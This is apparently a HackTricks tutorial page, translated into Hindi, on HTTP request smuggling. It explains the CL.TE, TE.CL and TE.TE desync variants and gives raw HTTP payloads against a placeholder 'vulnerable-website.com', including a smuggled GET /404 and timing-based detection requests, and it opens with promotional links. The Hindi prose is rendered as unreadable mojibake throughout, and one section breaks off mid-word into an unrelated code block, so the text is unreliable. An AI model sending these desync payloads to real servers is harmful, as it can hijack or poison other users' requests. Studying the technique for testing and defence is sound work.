# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs рд╕рдмрдорд┐рдЯ** рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдХреНрдпрд╛ рд╣реИ

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдПрдХ **рдЕрд╕рдордВрддреНрд░рд┐рддреАрдХрд░рдг** рд╣реИ рдЬреЛ **рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА** рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЛ рдПрдХ HTTP **рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ **рдлреНрд░рдВрдЯ-рдПрдВрдб** рдкреНрд░реЙрдХреНрд╕реА (рд▓реЛрдб рдмреИрд▓реЗрдВрд╕/рд░рд┐рд╡рд░реНрд╕-рдкреНрд░реЙрдХреНрд╕реА) рджреНрд╡рд╛рд░рд╛ **рдПрдХрд▓ рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ **2 рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВред\
рдЗрд╕рд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рдЕрдкрдиреЗ рдмрд╛рдж рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА** рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

### рд╕рд┐рджреНрдзрд╛рдВрдд

[**RFC рд╡рд┐рдирд┐рд░реНрджреЗрд╢рди (2161)**](https://tools.ietf.org/html/rfc2616)

> рдпрджрд┐ рдПрдХ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ рдПрдХ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг-рдХреЛрдбрди рд╢реАрд░реНрд╖рдХ рдХреНрд╖реЗрддреНрд░ рдФрд░ рдПрдХ рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ рд╢реАрд░реНрд╖рдХ рдХреНрд╖реЗрддреНрд░ рджреЛрдиреЛрдВ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рджреВрд╕рд░рд╛ рдЙрд╕реЗ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ**

> рд╕рд╛рдордЧреНрд░реА-рд▓рдВрдмрд╛рдИ рдПрдВрдЯрд┐рдЯреА рд╣реЗрдбрд░ рд╢реАрд░реНрд╖рдХ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЛ рднреЗрдЬреЗ рдЧрдП рдПрдВрдЯрд┐рдЯреА-рдмреЙрдбреА рдХрд╛ рдЖрдХрд╛рд░, рдмрд╛рдЗрдЯ рдореЗрдВ, рджрд░реНрд╢рд╛рддрд╛ рд╣реИред

**рд╕реНрдерд╛рдирд╛рдВрддрд░рдг-рдХреЛрдбрди: рдЯреБрдХрдбрд╝рд╛**

> рд╕реНрдерд╛рдирд╛рдВрддрд░рдг-рдХреЛрдбрди рд╣реЗрдбрд░ рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреЗрд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХреЗ рд╢рд░реАрд░ рдХреЛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдбрди рдХрд╛ рд░реВрдк рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред\
> рдЯреБрдХрдбрд╝рд╛ рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдмрдбрд╝реЗ рдбреЗрдЯрд╛ рдХреЛ рдЯреБрдХрдбрд╝реЛрдВ рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ

### рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛

**рдлреНрд░рдВрдЯ-рдПрдВрдб** (рд▓реЛрдб-рдмреИрд▓реЗрдВрд╕ / рд░рд┐рд╡рд░реНрд╕-рдкреНрд░реЙрдХреНрд╕реА) **content-length** рдпрд╛ **transfer-encoding** рд╣реЗрдбрд░ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ **рджреВрд╕рд░рд╛** рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ 2 рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рдмреАрдЪ **рдЕрд╕рдордВрддреНрд░рд┐рддреАрдХрд░рдг** рд╣реЛрддрд╛ рд╣реИред\
рдпрд╣ рдмрд╣реБрдд рдЧрдВрднреАрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА** рдЕрдиреБрдорддрд┐ рд╣реЛрдЧреА рдЬреЛ рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рдкреВрд░рд╛ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдЧрд╛ рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ **2 рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд░реЗрдЧрд╛ред рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЦрддрд░рд╛ рдЗрд╕ рддрдереНрдп рдореЗрдВ рдирд┐рд╣рд┐рдд рд╣реИ рдХрд┐ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ **2рд╡рд╛рдВ рдЕрдиреБрд░реЛрдз рдЗрдВрдЬреЗрдХреНрдЯ** рдХреЛ рдЙрд╕рдХреЗ **рдЕрдЧрд▓реЗ рдЧреНрд░рд╛рд╣рдХ рд╕реЗ рдЖрдпрд╛ рд╣реБрдЖ** рдорд╛рдиреЗрдЧрд╛ рдФрд░ рдЙрд╕ рдЧреНрд░рд╛рд╣рдХ рдХрд╛ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЕрдиреБрд░реЛрдз** **рдЗрдВрдЬреЗрдХреНрдЯреЗрдб рдЕрдиреБрд░реЛрдз** рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реЛрдЧрд╛ред

### рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ HTTP рдореЗрдВ **рдирдпрд╛ рдкрдВрдХреНрддрд┐ рд╡рд░реНрдг 2 рдмрд╛рдЗрдЯреЛрдВ рд╕реЗ рдмрдирд╛ рд╣реЛрддрд╛ рд╣реИ:**

* **Content-Length**: рдпрд╣ рд╣реЗрдбрд░ рдПрдХ **рджрд╢рдорд▓рд╡ рд╕рдВрдЦреНрдпрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЛ рднреЗрдЬреЗ рдЧрдП рдЕрдиреБрд░реЛрдз рдХреЗ рд╢рд░реАрд░ рдХреЗ **рдмрд╛рдЗрдЯреЛрдВ** рдХреА **рд╕рдВрдЦреНрдпрд╛** рджрд░реНрд╢рд╛рддрд╛ рд╣реИред рд╢рд░реАрд░ рдХрд╛ рдЕрдВрддрд┐рдо рд╡рд░реНрдгрд╛рддреНрдордХ рд╣реЛрдиреЗ рдХреА рдЙрдореНрдореАрдж рд╣реИ, **рдЕрдиреБрд░реЛрдз рдХреЗ рдЕрдВрдд рдореЗрдВ рдирдИ рдкрдВрдХреНрддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**ред
* **Transfer-Encoding:** рдпрд╣ рд╣реЗрдбрд░ **рдЕрдЧрд▓реЗ рдЪрдВрдХ** рдХреЗ **рдмрд╛рдЗрдЯреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛** рджрд░реНрд╢рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рд╕рдВрдЦреНрдпрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред **рдЪрдВрдХ** рдХреЛ рдПрдХ **рдирдИ рдкрдВрдХреНрддрд┐** рдХреЗ рд╕рд╛рде **рд╕рдорд╛рдкреНрдд** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдЗрд╕ рдирдИ рдкрдВрдХреНрддрд┐ рдХреЛ **рд▓рдВрдмрд╛рдИ рд╕реВрдЪрдХ рд╕реЗ рдЧрд┐рдирд╛ рдирд╣реАрдВ рдЬрд╛рддрд╛** рд╣реИред рдпрд╣ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рд╡рд┐рдзрд┐ рдХреЛ **0 рдХреЗ рдЖрдХрд╛рд░ рдХреЗ рдЪрдВрдХ рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ 2 рдирдИ рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЕрдиреБрд╕рд░рдг рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**: `0`
* **Connection**: рдореЗрд░реЗ рдЕрдиреБрднрд╡ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, **`Connection: keep-alive`** рдХрд╛ рдкрд╣рд▓реЗ рдЕрдиреБрд░реЛрдз рдкрд░ рдЕрдиреБрд╢рдВрд╕рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рдкрд░ред

## рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

рдЗрд╕рд▓рд┐рдП, рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рд╣рдорд▓реЛрдВ рдореЗрдВ `Content-Length` рд╣реЗрдбрд░ рдФрд░ `Transfer-Encoding` рд╣реЗрдбрд░ рджреЛрдиреЛрдВ рдХреЛ рдПрдХ рд╣реА HTTP рдЕрдиреБрд░реЛрдз рдореЗрдВ рд░рдЦрдиреЗ рдФрд░ рдЗрдиреНрд╣реЗрдВ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╕рдорд╛рд╡реЗрд╢ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдЕрдиреБрд░реЛрдз рдХреЛ рд╡рд┐рднрд┐рдиреНрдирддрд╛ рд╕реЗ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░реЗрдВред рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╣ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рджреЛ рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдкрд░:

* **CL.TE**: рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **TE.CL**: рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
* **TE.TE**: рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рджреЛрдиреЛрдВ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЗрдирдореЗрдВ рд╕реЗ рдПрдХ рд╕рд░реНрд╡рд░ рдХреЛрдИ рднреА рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рд╣реЗрдбрд░ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### CL.TE рд╕реБрд░рдХреНрд╖рд╛рддреНрдордХрддрд╛

рдпрд╣рд╛рдБ, **рдлреНрд░рдВрдЯ-рдПрдВрдб** рд╕рд░реНрд╡рд░ `Content-Length` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рдПрдХ рд╕рд░рд▓ HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ `Content-Length` рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ **рдмреЙрдбреА рдЕрдиреБрд░реЛрдз рдХреА рд▓рдВрдмрд╛рдИ 30 рдмрд╛рдЗрдЯ рд╣реИ** (_рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ HTTP рдирдИ рдкрдВрдХреНрддрд┐ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкреНрд░рддреНрдпреЗрдХ рдирдИ рдкрдВрдХреНрддрд┐ рдХреЗ рд▓рд┐рдП 2 рдмрд╛рдЗрдЯ рд╣реЛрддреЗ рд╣реИрдВ_), рдЗрд╕рд▓рд┐рдП рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА **рдкреВрд░реЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдмреИрдХ-рдПрдВрдб рднреЗрдЬреЗрдЧрд╛** рдФрд░ рдмреИрдХ-рдПрдВрдб `Transfer-Encoding` рд╣реЗрдбрд░ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рдХреЗ `GET /404 HTTP/1.1` рдХреЛ **рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреА рд╢реБрд░реБрдЖрдд** рдХреЗ рд░реВрдк рдореЗрдВ рдЫреЛрдбрд╝ рджреЗрдЧрд╛ (рдмрд╛рд░реАрдХреА рд╕реЗ, рдЕрдЧрд▓рд╛ рдЕрдиреБрд░реЛрдз `Foo:x<рдЕрдЧрд▓рд╛ рдЕрдиреБрд░реЛрдз рдпрд╣рд╛рдБ рд╕реЗ рд╢реБрд░реВ рд╣реЛрдд
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
рдЬрдм рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХреЗрд╡рд▓ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рдЖрдЧреЗ рднреЗрдЬреЗрдЧрд╛, `0` рдХреЛ рдЫреЛрдбрд╝ рджреЗрдЧрд╛ред рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдкрд╣рд▓реЗ рдЪрдВрдХ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЕрдЧрд▓реЗ рдЪрдВрдХ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдПрдХ рджреГрд╢реНрдпрдорд╛рди рд╕рдордп рджреЗрд░реА рд╣реЛрдЧреАред

рдХрднреА-рдХрднреА, рдЯрд╛рдЗрдордЖрдЙрдЯ рдХреА рдмрдЬрд╛рдп рдЖрдк рдЕрдВрддрд┐рдо рд╣реЛрд╕реНрдЯ рд╕реЗ 400 рдмреИрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЬрд╣рд╛рдВ рдПрдХ рд╕реАрдПрд▓.рдЯреАрдИ рдкреЗрд▓реЛрдб рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (444).png>)

рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдмреЙрдбреА рдореЗрдВ рдПрдХ рддреНрд░реБрдЯрд┐ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣реИрдкреНрд░реЙрдХреНрд╕реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕рдВрд╕реНрдХрд░рдг рднреА рд╣реИ:

![](<../../.gitbook/assets/image (443).png>)

### рд╕рдордп рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреАрдИ.рд╕реАрдПрд▓ рджреБрд░реНрдмрд▓рддрд╛рдПрдБ рдЦреЛрдЬрдирд╛

рдпрджрд┐ рдХреЛрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЯреАрдИ.рд╕реАрдПрд▓ рд╡реЗрд░рд┐рдПрдВрдЯ рдХреЗ рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╡рдВрд░реНрдгрдиреАрдп рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХрд╛ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдкрд░ рдЕрдХреНрд╕рд░ рд╕рдордп рдореЗрдВ рджреЗрд░реА рд╣реЛрдЧреА:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### рдПрдЪрдЯреАрдЯреАрдкреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреАрдЬ рдХреА рдЬрд╛рдВрдЪ

рдЬрдм рдЖрдкрдиреЗ рдкрд╛рдпрд╛ рд╣реИ рдХрд┐ **рд╕рдордпрд┐рдХ рддрдХрдиреАрдХреЗрдВ рдХрд╛рдо рдХрд░ рд░рд╣реА рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ рдпрд╣ рдкреНрд░реЛрдм рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдЖрдк **рдЕрдиреНрдп рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЕрдкрдиреЗ рдЕрдкрдиреЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ рдкреЙрдЗрдЬрд╝рди рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ, **рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `/` рдХреЗ рд▓рд┐рдП рдПрдХ 404 рд╡рд╛рдкрд╕реА рдХреЗ рд▓рд┐рдП рдПрдХ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХрд░реЗрдВ**ред\
[рдмреЗрд╕рд┐рдХ рдЙрджрд╛рд╣рд░рдгреЛрдВ](./#basic-examples) рдореЗрдВ рд╣рдордиреЗ рдкрд╣рд▓реЗ рд╣реА рджреЗрдЦрд╛ рдХрд┐ `CL.TE` рдФрд░ `TE.CL` рдЙрджрд╛рд╣рд░рдг рдХреИрд╕реЗ рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ рдкреЙрдЗрдЬрд╝рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `/404` рдХреЗ рд▓рд┐рдП рдПрдХ 404 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдиреЛрдЯреНрд╕**

рдЕрдиреНрдп рд░рд┐рдХреНрд╡реЗрд╕реНрдЯреЛрдВ рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░рдХреЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧреНрд▓рд┐рдВрдЧ рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреАрдЬ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╕рдордп рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рдЪрд╛рд░реЛрдВ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрдирд╛ рдЪрд╛рд╣рд┐рдП:

* "рд╣рдорд▓рд╛" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдФрд░ "рд╕рд╛рдорд╛рдиреНрдп" рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ рд╕рд░реНрд╡рд░ рдХреЛ рдЕрд▓рдЧ рдиреЗрдЯрд╡рд░реНрдХ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреЗрдЬрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рджреЛрдиреЛрдВ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХреЛ рдПрдХ рд╣реА рдХрдиреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрдиреЗ рд╕реЗ рдпрд╣ рд╕рд┐рджреНрдз рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдХрд┐ рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдореМрдЬреВрдж рд╣реИред
